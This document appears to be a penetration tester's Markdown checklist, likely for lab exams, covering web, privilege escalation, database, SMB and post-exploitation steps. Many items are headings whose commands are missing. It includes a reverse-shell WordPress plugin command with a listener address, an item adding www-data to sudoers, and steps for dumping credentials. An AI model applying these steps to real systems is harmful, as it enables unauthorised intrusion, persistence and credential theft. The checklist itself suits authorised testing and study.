# Checklists
## Http
- [ ] Run: OpenVAS, Nessus, Nikto and Nexpose
- [ ] Run DirBuster, and DIRB to try and get a directory listing
- [ ] Identify any CRMs or other web apps running
- [ ] Check for virtual domain requirements.  Does the site have links to it's own domain?
- [ ] Add the domain to the /ect/hosts file
- [ ] Check for any pages that allow input, or URLs, and test for bruteforce.
- [ ] Does this have WP? (y/N)
- [ ] Do you have access to the control panel?
- [ ] You can use a WP reverse shell if you like (msfvenom required): https://github.com/wetw0rk/malicious-wordpress-plugin
- [ ] wordpwn.py [LHOST] [LPORT] [HANDLER]  (HANDLER is Y or N) 
wordpwn.py 192.168.0.6 8888 Y
This will generate a plugin to install, and will listen on your machine for a connection
- [ ] Also remember to download any server side code when possible, that way you can look for issues/bugs, or hardcoded passwords
- [ ] See if we can inject our own code like in the 404 template
- [ ] Does this have Flash/Flex? (y/N)
- [ ] Utilize 'deblazy.py' for common checks
- [ ] Check for robots.txt

## EscalationLinux
- [ ] Documents downloaded and ready:
- [ ] Find linux distribution, version architecture:
- [ ] Run the built-in checklists and manual (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
- [ ] Look for SUID and GUID bit set:
- [ ] Get a list of users from /etc/passwd, and check for weak passwords
- [ ] Try and run the local enumeration scripts
- [ ] Try escalating with Python:
- [ ] Another Python escalation
- [ ] Interactive Shell
- [ ] From within tcpdump:
- [ ] Get list of sudo files
- [ ] Things to look:
- [ ] SU sudo with no password
- [ ] What services are running as root?:
- [ ] Look for vulnerable/privileged components such as: mysql, sudo, udev, python
- [ ] Is /etc/exports is writable?
- [ ] The following command will list processes running by root, permissions and NFS exports
- [ ] If Mysql is running as root try sys_exec():
- [ ] Environment variables:
- [ ] Find printers: lpstat -a
- [ ] Find apps installed:
- [ ] Find writable configuration files:
- [ ] Grep hard coded passwords:
- [ ] User bash history:
- [ ] User mails:
- [ ] Find interesting binaries:
- [ ] Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path:
- [ ] If you can just change PATH, the following will add a poisoned ssh binary:
- [ ] Generating SUID C Shell for /bin/bash:
- [ ] Without interactive shell:
- [ ] If /etc/passwd has incorrect permissions:
- [ ] Add user www-data to sudoers with no password:
- [ ] If you can sudo chmod:
- [ ] Wildcard injection if there is a cron with a wildcard
- [ ] World readable/writable files:
- [ ] Ring0 kernel exploit for 2.3/2.4:
- [ ] Inspect web traffic:
- [ ] The following script runs exploit suggester and automatically downloads and executes suggested exploits:
- [ ] Other scripts (These are already downloaded):

## EscalationWindows
- [ ] Information gathering:
- [ ] Try dumping the SAM file
- [ ] Check for weak permissions on processes running
- [ ] Try and run the local enumeration python script
- [ ] Other scripts (These are already downloaded):
- [ ] Cleartext Passwords:
- [ ] Change the upnp service binary (XP):
- [ ] Weak Service Permissions:
- [ ] Code for creating a new local admin:
- [ ] Unquoted Service Paths:
- [ ] Always Install Elevated:
- [ ] Group Policy Preference:

## FileTransfer
- [ ] Some options:

## MySql
- [ ] Check for default usernames and passwords.
- [ ] Check for same username and password.
- [ ] Check for blank password.
- [ ] Run bruteforce
- [ ] Standard enumeration commands:
- [ ] List all tables and columns:
- [ ] Execute OS commands:
- [ ] MySQL Root to System Root w/ lib_mysqludf_sys

## NetworkScan
- [ ] Initial Scan
- [ ] Use Masscan, and Sparta to get a second scan
- [ ] Use Nmap, and Sparta and do a slow, stealthly thrid scan, and be sure to get every port.
- [ ] Find all HTTP servers and run the big 4 scanners on them (Nikto, Nessus, Nexpose, OpenVAS)
- [ ] Do a full TCP/UDP slow and silent scan on each machine. (should take about a week)'

## NotableExploits
- [ ] Linux Kernel <= 2.6.36-rc8
- [ ] Linux Kernel <= 2.6.37
- [ ] Linux Kernel 2.6.39 < 3.2.2
- [ ] Linux kernel < 3.2.2
- [ ] Linux Kernel <= 3.19.0-73.8
- [ ] Linux 2.6.32

## Oracle DB
- [ ] Check for default usernames and passwords
- [ ] Check for same username and password
- [ ] Check for blank password
- [ ] Run bruteforce
- [ ] Standard enumeration commands:

## PHP
- [ ] Downloaded file:
- [ ] Looking for LFI/RFI:
- [ ] What you can do with LFI:
- [ ] What you can do with RFI:
- [ ] PHP ZIP Wrapper LFI:

## Postgres Server
- [ ] Check for default usernames and passwords
- [ ] Check for same username and password
- [ ] Check for blank password
- [ ] Run bruteforce
- [ ] Standard enumeration commands:
- [ ] List Tables:

## RootedLinux
- [ ] Grab the shadow file for cracking later.
- [ ] Grab the proof.txt file in the /root dir.
- [ ] Check network interfaces for what networks it is connected to:
- [ ] Remember you might need to use this to pivot.
- [ ] Run sniffer to see what operations are going on.
- [ ] Add public key to authorized keys:
- [ ] Use netstat to find other machines connected: netstat -ano

## RootedWindows
- [ ] Grab hashes for cracking later:
- [ ] Use wce.exe -w to extract any passwords in memory.
- [ ] Grab the C:\Users\Administrator\Desktop\proof.txt file in the desktop dir.
- [ ] Check network interfaces for what networks it is connected to.
- [ ] Remember you might need to use this to pivot.
- [ ] Run sniffer to see what operations are going on.
- [ ] Run Get-GPPPassword from Powersploit to get group.xml encrypted passwords.
- [ ] Use netstat to find other machines connected: netstat -ano

## SMB
- [x] Enumerate
- [x] Null session check
- [ ] NetBIOS over TCP/IP client used to lookup NetBIOS names
- [ ] Check for MS08-067
- [ ] Vulnerability Scanning
- [ ] Bruteforce

## SQL Server
- [ ] Check for default usernames and passwords
- [ ] Check for same username and password
- [ ] Check for blank password
- [ ] Run bruteforce
- [ ] Standard enumeration commands:

